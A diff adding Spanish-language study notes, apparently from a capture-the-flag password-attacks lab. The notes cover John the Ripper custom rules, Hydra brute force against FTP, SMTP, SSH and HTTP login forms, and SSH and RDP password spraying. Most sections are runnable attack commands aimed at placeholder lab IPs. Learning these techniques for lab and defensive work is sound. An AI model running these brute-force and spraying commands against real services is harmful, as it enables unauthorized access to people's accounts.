@@ -241,6 +241,144 @@ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
 - | wc -l: cuenta cuantas lineas produce john
 
 
+## REGLAS PERSONALIZADAS
+
+```
+sudo vi /etc/john/john.conf
+[List.Rules:THM-Password-Attacks] 
+Az"[0-9]" ^[!@#$]
+```
+
+[List.Rules:THM-Password-Attacks] - Especifica el nombre de la regla
+Az - Representa una letra del diccionario que usara
+0-9 . diginos del 0-9
+caracteres especiales
+
+
+```
+echo "password" > /tmp/single.lst
+john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
+Using default input encoding: UTF-8 
+!password0 
+@password0 
+#password0 
+$password0
+```
+
+# CONTRASEÑAS ONLINE
+
+El ataque de contraseñas onlina nos metemos en un mundo grande y además en el mundo de los servicios que usan usuario y contraseña.
+
+## HYDRA
+
+Hydra suportea un monton de servicios de red para atacar. Usando hydra, podemos hacer fuerza bruta en servicios en red como FTP, SMTP, SSH etc.
+
+### FTP
+
+Siguiendo con esto, un ataque de fuerza bruta a ftp sería:
+
+```
+hydra -l ftp -P pass.txt ftp:/10.10.x.x
+```
+
+- l ftp usuario especificado, usamos -L para wordlist de usuarios
+- -P ruta
+- ftp://10.10 ip y protocolo
+
+### SMTP
+
+Similar a los servidores FTp, 
+
+```
+hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+```
+
+### SSH
+
+Igual que los otros
+
+```
+hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
+```
+
+### HTTP PAGINAS DE LOGEO
+
+```
+hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+```
+
+- -l usuario
+- -p ruta
+- 10.10 ip
+- http-get-form tipo de consulta
+- login-get/index.php ruta a lo que queremos
+- user= pararmetros donde queremos que meta la fuerza bruta
+- -f para parar cuando encuentre la valida.
+
+Tenemos mas herramientas para aprender:
+
+- Medusa
+- Ncrack
+
+# ATAQUE DE PULVERICACIÓN DE CONTRASEÑA
+
+Son técnicas efectivas para identificar credenciales validas. Esta tecnica se utiliza para servicios y autentificacion de sistemas online como SSH,SMB,RDP,SMTP,Outlook etc.
+
+Especificando usuario intentando contraseñas predecibles. Mientras que setos ataques prueban con muchos usuarios con contraseñas comunes.
+
+![image](https://github.com/user-attachments/assets/29aff307-74e4-4dc0-9007-17354fd34174)
+
+## SSH
+
+```
+cat username-list.txt
+admin
+victim
+dummy
+adm
+sammy
+hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+```
+
+## RDP
+
+```
+python3 RDPassSpray.py -h
+usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -U USERLIST, --userlist USERLIST
+                        Users list to use, one user per line
+  -u USER, --user USER  Single user to use
+  -p PASSWORD, --password PASSWORD
+                        Single password to use
+  -P PASSWORDLIST, --passwordlist PASSWORDLIST
+                        Password list to use, one password per line
+  -T TARGETLIST, --targetlist TARGETLIST
+                        Targets list to use, one target per line
+  -t TARGET, --target TARGET
+                        Target machine to authenticate against
+  -s SLEEP, --sleep SLEEP
+                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
+  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
+                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
+  -d DOMAIN, --domain DOMAIN
+                        Domain name to use
+  -n NAMES, --names NAMES
+                        Hostnames list to use as the source hostnames, one per line
+  -o OUTPUT, --output OUTPUT
+                        Output each attempt result to a csv file
+  -V, --verbose         Turn on verbosity to show failed attempts
+```
+
+```
+python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
+python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+```
+
+
+
 
 
 
